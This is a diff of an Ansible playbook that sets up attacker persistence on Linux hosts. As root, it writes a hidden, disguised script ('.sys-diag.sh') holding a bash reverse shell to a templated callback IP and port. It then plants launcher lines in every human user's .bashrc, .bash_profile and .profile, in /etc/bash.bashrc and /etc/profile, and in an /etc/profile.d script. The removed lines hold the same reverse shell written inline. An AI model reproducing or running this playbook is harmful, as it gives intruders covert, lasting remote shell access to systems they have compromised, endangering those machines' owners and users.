@@ -1,20 +1,33 @@
-# playbooks/shell_profile_persistence.yml
+# Made by
+# Jason Hyde
+# jth1987@rit.edu
 ---
 - name: Shell Profile Persistence
   hosts: targets
   become: yes
-  gather_facts: yes  # needed so we can iterate over real users
+  gather_facts: yes
 
   vars:
     profile_files:
       - .bashrc
       - .bash_profile
       - .profile
-    payload_line: |
-      # system diagnostics
-      nohup bash -c 'if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1; fi' >/dev/null 2>&1 &
+    payload_script: /usr/local/lib/.sys-diag.sh
+    payload_line: "[ -f {{ payload_script }} ] && setsid {{ payload_script }} >/dev/null 2>&1 &"
 
   tasks:
+
+    - name: Write payload to hidden script file
+      copy:
+        dest: "{{ payload_script }}"
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          if ! pgrep -f "{{ callback_ip }}" > /dev/null 2>&1; then
+            bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1
+          fi
 
     - name: Get list of human users on the system
       shell: |
@@ -31,7 +44,7 @@
         owner: "{{ item[0].split(':')[0] }}"
         mode: '0644'
       loop: "{{ human_users.stdout_lines | product(profile_files) | list }}"
-      ignore_errors: yes  # skip if file doesn't exist for that user
+      ignore_errors: yes
 
     - name: Inject into root shell profiles
       lineinfile:
@@ -50,11 +63,11 @@
         line: "{{ payload_line }}"
         state: present
       loop:
-        - /etc/bash.bashrc       # runs for every interactive bash shell
-        - /etc/profile           # runs for every login shell
+        - /etc/bash.bashrc
+        - /etc/profile
       ignore_errors: yes
 
-    - name: Also inject into /etc/profile.d/ as a standalone script
+    - name: Drop profile.d script
       copy:
         dest: /etc/profile.d/sys-diag.sh
         mode: '0755'
@@ -62,4 +75,4 @@
         group: root
         content: |
           #!/bin/bash
-          nohup bash -c 'if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1; fi' >/dev/null 2>&1 &
+          [ -f {{ payload_script }} ] && setsid {{ payload_script }} >/dev/null 2>&1 &
